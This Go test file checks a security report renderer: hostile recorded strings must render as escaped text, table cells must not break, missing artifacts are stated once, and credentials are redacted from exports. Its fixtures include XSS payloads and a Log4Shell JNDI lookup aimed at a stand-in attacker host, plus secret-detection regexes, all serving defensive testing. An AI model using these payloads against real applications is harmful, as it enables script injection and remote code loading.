package report

import (
	"regexp"
	"strings"
	"testing"
)

// T084 (FR-025, C-P35): hostile recorded strings render as text, a missing optional artifact
// produces one honest availability statement rather than a warning repeated inside every
// vulnerability description, and no export carries a credential or a secret.
func TestHostileStringsAndMissingArtifactsRenderSafely(t *testing.T) {
	in := fixture016Input(t)
	hostile := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert(1)>`,
		`"><svg/onload=confirm(1)>`,
		"line1\nline2|cell",
		`javascript:alert(1)`,
		`${jndi:ldap://attacker/x}`,
	}
	in.Doc.Findings = append(in.Doc.Findings, map[string]any{
		"id": "CAND-hostile016", "title": hostile[0] + " " + hostile[1], "severity": "High",
		"cwe": "CWE-79", "cwe_family": "xss", "location": "x.py:1", "entry_point": hostile[2],
		"verification_status": "supported", "from_confirmed": true,
		"verification_record": map[string]any{
			"rationale":       hostile[3],
			"security_impact": hostile[4],
			"evidence":        []any{map[string]any{"path": "x.py", "start_line": float64(1), "end_line": float64(2), "quote": hostile[5]}},
		},
	})
	m := BuildModel(in)
	h := renderHTMLModel(in, m)
	md := renderMarkdownModel(in, m)

	// HTML: a hostile string renders as text. What must not survive is MARKUP — an element
	// the browser would parse, or an attribute it would act on. Inert text that merely
	// contains the characters of an attack (a jndi lookup, the word onerror inside an
	// escaped tag) is exactly what correct escaping produces, so the check targets the
	// dangerous shapes rather than the words.
	for _, bad := range []string{
		"<script>alert", "<img src=x", "<svg/onload", "<svg onload",
		`href="javascript:`, `src="javascript:`, "<iframe", "<object",
	} {
		if strings.Contains(h, bad) {
			t.Errorf("the html carries live markup: %q", bad)
		}
	}
	// No event-handler attribute anywhere in the document: the page's own interactivity is
	// inline onclick/oninput on controls it writes itself, so this check is scoped to the
	// parts that carry recorded text.
	// Stronger than pattern-matching for attack words, which correct escaping leaves in the
	// text: every element in the rendered issue content must be one the renderer itself
	// emits. An attacker-controlled element cannot exist if no unexpected tag name does.
	allowed := map[string]bool{
		"details": true, "summary": true, "span": true, "dl": true, "dt": true, "dd": true,
		"ul": true, "ol": true, "li": true, "p": true, "code": true, "pre": true,
		"figure": true, "figcaption": true, "h4": true, "b": true, "i": true, "br": true,
		"div": true, "/div": true,
		"/details": true, "/summary": true, "/span": true, "/dl": true, "/dt": true, "/dd": true,
		"/ul": true, "/ol": true, "/li": true, "/p": true, "/code": true, "/pre": true,
		"/figure": true, "/figcaption": true, "/h4": true, "/b": true, "/i": true,
	}
	for _, tag := range regexp.MustCompile(`</?[A-Za-z][A-Za-z0-9]*`).FindAllString(detailsHTML(h), -1) {
		name := strings.ToLower(strings.TrimPrefix(tag, "<"))
		if !allowed[name] {
			t.Errorf("rendered issue content contains the unexpected element <%s>", name)
		}
	}
	if !strings.Contains(h, "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;") {
		t.Error("the hostile title was not escaped as text")
	}
	// Markdown: a newline or a pipe inside a table cell cannot break the table.
	index := sectionOf(t, md, hdrIssues)
	for _, line := range strings.Split(index, "\n") {
		if !strings.HasPrefix(strings.TrimSpace(line), "|") {
			continue
		}
		if n := strings.Count(line, "|") - strings.Count(line, `\|`); n != 6 {
			t.Errorf("an index row has %d unescaped pipes, so the table is broken: %q", n, line)
		}
	}

	// A missing optional artifact is stated once, not repeated per issue.
	// (detailsHTML below isolates the rendered issue content from the page's own controls.)
	withoutDiagram := in
	withoutDiagram.Repro = nil
	md2 := renderMarkdownModel(withoutDiagram, BuildModel(withoutDiagram))
	details := sectionOf(t, md2, hdrDetails)
	for _, warn := range []string{"artifact missing", "not available for this run", "could not be read"} {
		if n := strings.Count(details, warn); n > 1 {
			t.Errorf("the warning %q is repeated %d times inside the vulnerability descriptions", warn, n)
		}
	}

	// Credentials and secrets never reach an export, from any recorded field.
	leaky := in
	leaky.Host = "https://svc:AKIAIOSFODNN7EXAMPLE@llm.internal:8443"
	leaky.Model = "gpt-oss:120b"
	lm := BuildModel(leaky)
	for name, body := range map[string]string{
		"markdown":        renderMarkdownModel(leaky, lm),
		"standalone html": renderHTMLModel(leaky, lm),
	} {
		for _, secret := range []string{"AKIAIOSFODNN7EXAMPLE", "svc:AKIA"} {
			if strings.Contains(body, secret) {
				t.Errorf("%s leaked a credential: %q", name, secret)
			}
		}
		// Common secret shapes, in case a recorded field carried one.
		for _, re := range []*regexp.Regexp{
			regexp.MustCompile(`(?i)\b(?:api[_-]?key|secret|password|token)\s*[:=]\s*["']?[A-Za-z0-9_\-]{16,}`),
			regexp.MustCompile(`\bAIza[0-9A-Za-z_\-]{30,}\b`),
			regexp.MustCompile(`\bsk-[A-Za-z0-9]{20,}\b`),
		} {
			if loc := re.FindString(body); loc != "" {
				t.Errorf("%s carries something shaped like a secret: %q", name, loc)
			}
		}
		// The endpoint is still named, so provenance survives redaction.
		if !strings.Contains(body, "llm.internal:8443") {
			t.Errorf("%s dropped the endpoint host while redacting", name)
		}
	}
}

// detailsHTML returns the issue-details region of the page, which is where recorded text is
// rendered; the page's own controls and script live outside it.
func detailsHTML(h string) string {
	i := strings.Index(h, `<div id="details">`)
	if i < 0 {
		return ""
	}
	rest := h[i:]
	if j := strings.Index(rest, `<h2 id="needs-review-h">`); j >= 0 {
		return rest[:j]
	}
	return rest
}

// T084 (FR-025): artifact availability is stated rather than left to a broken link.
func TestArtifactAvailabilityIsStated(t *testing.T) {
	in := fixture016Input(t)
	m := BuildModel(in)
	md := renderMarkdownModel(in, m)

	// The records the report points at are named with their paths, so a reader knows what
	// exists and where.
	for _, ref := range []string{m.Refs["review_units"], m.Refs["hunt_execution"], m.Refs["sessions"], m.Appendix.ArtifactsRef} {
		if ref == "" {
			continue
		}
		if !strings.Contains(md, ref) {
			t.Errorf("the report does not name the record %q", ref)
		}
	}
	// An issue with no captured evidence says so instead of leaving the section blank.
	empty := 0
	for _, is := range m.Presentation.Issues {
		if len(is.Evidence) == 0 {
			empty++
		}
	}
	if empty > 0 && !strings.Contains(md, "**Captured evidence**: none recorded") {
		t.Error("an issue with no evidence does not disclose the absence")
	}
	// A location the records could not resolve is disclosed, never silently dropped.
	unresolvable := 0
	for _, is := range m.Presentation.Issues {
		for _, l := range is.Locations {
			if !l.Available {
				unresolvable++
			}
		}
	}
	if unresolvable > 0 && !strings.Contains(md, "citation not resolvable") {
		t.Error("an unresolvable citation is not disclosed")
	}
}
